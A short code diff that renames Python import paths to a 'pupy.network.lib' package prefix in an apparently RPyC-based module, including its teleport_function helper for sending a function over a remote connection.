@@ -10,8 +10,8 @@ import inspect
 
 from io import open
 
-from network.lib.compat import pickle, execute, is_py3k
-from network.lib.rpc.core.service import ModuleNamespace
+from pupy.network.lib.compat import pickle, execute, is_py3k
+from pupy.network.lib.rpc.core.service import ModuleNamespace
 from contextlib import contextmanager
 
 #===============================================================================
@@ -256,6 +256,6 @@ def teleport_function(conn, func):
     :param conn: the RPyC connection
     :param func: the function object to be delivered to the other party
     """
-    from network.lib.rpc.utils.teleportation import export_function
+    from pupy.network.lib.rpc.utils.teleportation import export_function
     exported = export_function(func)
     return conn.modules["network.lib.rpc.utils.teleportation"].import_function(exported)
